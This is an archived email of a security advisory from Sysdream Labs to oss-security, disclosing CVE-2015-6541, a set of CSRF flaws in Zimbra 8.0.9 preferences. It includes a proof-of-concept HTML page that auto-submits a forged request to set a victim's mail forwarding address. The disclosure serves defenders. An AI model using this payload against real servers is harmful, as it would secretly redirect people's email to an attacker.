X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3971" "Thursday" "25" "February" "2016" "14:13:45" "+0100" "Sysdream Labs" "labs@sysdream.com" "<56CEFE09.20104@sysdream.com>" "132" "[oss-security] CVE-2015-6541 : Multiple CSRF in Zimbra Mail interface" "^Date:" nil nil "2" "2016022513:13:45" "[oss-security] CVE-2015-6541 : Multiple CSRF in Zimbra Mail interface" (number mark "U       labs@sysdrea Feb 25  132/3971  " thread-indent "\"[oss-security] CVE-2015-6541 : Multiple CSRF in Zimbra Mail interface\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28331 invoked by uid 550); 25 Feb 2016 14:09:00 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 14018 invoked from network); 25 Feb 2016 13:14:24 -0000
X-Virus-Scanned: amavisd-new at sysdream.com
Message-ID: <56CEFE09.20104@sysdream.com>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.6.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="gePr8elFWSjbOUcdpW3kBHIwtpRtMg8d2"
Date: Thu, 25 Feb 2016 14:13:45 +0100
From: Sysdream Labs <labs@sysdream.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2015-6541 : Multiple CSRF in Zimbra Mail interface
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com

--gePr8elFWSjbOUcdpW3kBHIwtpRtMg8d2
Content-Type: multipart/mixed; boundary="OqUxguwUgmTtuqKSIdxua30futB9v2qmN"
From: Sysdream Labs <labs@sysdream.com>
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com
Message-ID: <56CEFE09.20104@sysdream.com>
Subject: CVE-2015-6541 : Multiple CSRF in Zimbra Mail interface

--OqUxguwUgmTtuqKSIdxua30futB9v2qmN
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Multiple CSRF in Zimbra Mail interface
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D


CVE-2015-6541

Description
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Multiple CSRF vulnerabilities have been found in the Mail interface of
Zimbra 8.0.9 GA Release, enabling to change account
preferences like e-mail forwarding.


CSRF
=3D=3D=3D=3D

Forms in the preferences part of old releases of Zimbra are vulnerable
to CSRF because of the lack of a CSRF token identifying a valid session.
As a consequence, requests can be forged and played arbitrarily.

**Access Vector**: remote
**Security Risk**: low
**Vulnerability**: CWE-352
**CVSS Base score**: 5.8

----------------
Proof of Concept
----------------

<html>
<body>
<form enctype=3D"text/plain" id=3D"trololo"
action=3D"https://192.168.0.171/service/soap/BatchRequest" method=3D"POST">
    <input name=3D'<soap:Envelope
xmlns:soap=3D"http://www.w3.org/2003/05/soap-envelope"><soap:Header><context
xmlns=3D"urn:zimbra"><userAgent xmlns=3D"" name=3D"ZimbraWebClient - FF38
(Win)" version=3D"8.0.9_GA_6191"/><session xmlns=3D"" id=3D"19"/><account
xmlns=3D"" by=3D"name">anto@mail.ubuntu.fr</account><format xmlns=3D""
type=3D"js"/></context></soap:Header><soap:Body><BatchRequest
xmlns=3D"urn:zimbra" onerror=3D"stop"><ModifyPrefsRequest
xmlns=3D"urn:zimbraAccount" requestId=3D"0"><pref xmlns=3D""
name=3D"zimbraPrefMailForwardingAddress">itworks@ubuntu.fr</pref></ModifyPr=
efsRequest><a
xmlns=3D"" n'
value=3D'"sn">itworks</a></BatchRequest></soap:Body></soap:Envelope>'/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>


Solution
=3D=3D=3D=3D=3D=3D=3D=3D

Sensitive forms should be protected by a CSRF token.


Fixes
=3D=3D=3D=3D=3D

Fixed with 8.5 release : bug 83547
(https://wiki.zimbra.com/wiki/Security/Collab/86#Notes_from_8.5)


Affected versions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

 * Zimbra <=3D 8.0.9 GA Release


Credits
=3D=3D=3D=3D=3D=3D=3D

 * Anthony LAOU-HINE TSUEI, Sysdream (laouhine_anthony -at- hotmail
-dot- fr)
 * Damien CAUQUIL, Sysdream (d.cauquil -at- sysdream -dot- com)


--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--OqUxguwUgmTtuqKSIdxua30futB9v2qmN--

--gePr8elFWSjbOUcdpW3kBHIwtpRtMg8d2
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJWzv4KAAoJEI60jNnVslmh6e8P/Awrvzxa+kykR5ED2amCc/xd
EbEQtibr7Rqx7fLGdnynCC1yUIdnHapbv3F7fW1hlsOVzMGlM8FKYZNTh2XtTetu
AusPd/CvIWAuGMxwPonhtbtf/NyrCR9QVjkG4TwCKAk474gaSzM/vzkY3ofnalte
g80QzKSAgjI2HvuC7AUhkvxRZWxw23mNJd8jzeXPyXrx9WFN78Ab+TaZDzi9Ipp3
HrFKiaOIuJj+CTwjea2LD9cVJdCNCjrEgUVjb3fs1Il3dDj6urLlIBq1SfWWmAgf
1PkgDEoc6gTOd/C1bqLCP/ccnt3YTsfuTc8R6TG5PMQgR+Vv2FbtWchvQWVk9P8l
jTzVWBuExQ3M/c/aw+OEz0IR4PcKp4xpKiA6kNZ4rb9GLW1EQmIOwTWCyuO1qKV9
0xBeDiu1MEp7Fy4wPtwUDocrRSTl1YdWf0zh4/BGYy7iRMq/NBXJYJzx5tpu+Lp7
q7/rYK1AR/105S+2BgGwb6v3ClzaNFUBIndQoLUYku7yj+8ArusecMJpn2RcGVa2
F+/MWupxuoHhF/NuVk2t7jpwxvgkZHSvMctvZnvEvzPjQFdu51wg4ebCnC2UtswS
uTjOuN1zDP7C1Ue7frpTv1WygjgJLcSKIV1j99y88AhQjZPKiC5obwkKyMHmFg4M
mFEngFJIcE9O861fWTXu
=j5sa
-----END PGP SIGNATURE-----

--gePr8elFWSjbOUcdpW3kBHIwtpRtMg8d2--
